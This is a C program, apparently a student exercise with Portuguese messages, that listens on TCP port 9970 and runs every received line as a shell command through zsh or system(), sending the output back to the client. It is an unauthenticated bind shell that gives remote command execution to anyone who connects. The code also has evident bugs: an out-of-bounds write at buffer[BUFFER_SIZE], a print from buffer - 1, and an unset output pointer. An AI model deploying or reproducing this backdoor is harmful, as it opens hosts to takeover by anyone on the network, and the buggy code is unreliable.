#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/wait.h>

#define PORT 9970
#define BUFFER_SIZE 2048

char	*my_popen(const char *cmd, char **environ)
{
	int		fd[2];
	pid_t	pid;
	char	*shell;
	char	*argv[4];
	char	buffer[1024];
	char	*result;
	int		nbytes;
	int		total;
	int		status;

	shell = "/bin/zsh";
	if (pipe(fd) == -1)
		return (NULL);
	pid = fork();
	if (pid == -1)
		return (NULL);
	if (pid == 0)
	{
		close(fd[0]);
		dup2(fd[1], STDOUT_FILENO);
		dup2(fd[1], STDERR_FILENO);
		close(fd[1]);

		argv[0] = shell;
		argv[1] = "-c";
		argv[2] = (char *)cmd;
		argv[3] = NULL;
		execve(shell, argv, environ);
		exit(1);
	}
	close(fd[1]);
	total = 0;
	result = malloc(1);
	if (!result)
		return (NULL);
	result[0] = '\0';
	nbytes = read(fd[0], buffer, sizeof(buffer) - 1);
	while (nbytes > 0)
	{
		buffer[nbytes] = '\0';
		result = realloc(result, total + nbytes + 1);
		if (!result)
			return (NULL);
		memcpy(result + total, buffer, nbytes + 1);
		total += nbytes;
		nbytes = read(fd[0], buffer, sizeof(buffer) - 1);
	}
	close(fd[0]);
	waitpid(pid, &status, 0);
	return (result);
}

int	main(int AC, char *av[], char **env)
{
	//while (1)
	//{
		int	server_fd, client_fd;
		char	*output;
		int	bytes_read;
		struct sockaddr_in server_addr, client_addr;
		socklen_t client_len = sizeof(client_addr);
		char	buffer[BUFFER_SIZE];

		server_fd = socket(AF_INET, SOCK_STREAM, 0);
		if (server_fd < 0)
			perror("Erro ao criar socket"), exit(1);

		server_addr.sin_family = AF_INET;
		server_addr.sin_addr.s_addr = INADDR_ANY;
		server_addr.sin_port = htons(PORT);

		if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
		{
			perror("Erro ao fazer bind");
			exit(1);
		}

		listen(server_fd, 1);
		printf("Servidor ouvindo na porta %d...\n", PORT);

		client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
		if (client_fd < 0)
		{
			perror("Erro ao aceitar conexão");
			exit(1);
		}

		printf("Cliente conectado.\n");

		while (1)
		{
			memset(buffer, 0, BUFFER_SIZE);
			bytes_read = read(client_fd, buffer, BUFFER_SIZE - 1);
			if (bytes_read <= 0)
				break ;
			buffer[BUFFER_SIZE] = '\0';
			printf("Comando recebido: %s ;", buffer - 1);
			
			if (strncmp(buffer, "mode", 4) == 0)
				system(buffer + 4);
			else
				output = my_popen(buffer, env);
			
			//printf("Comando ***: \n%s\n", output);
			
			write(client_fd, output, strlen(output));
		}
		close(client_fd);
		close(server_fd);
	//}
	return 0;
}

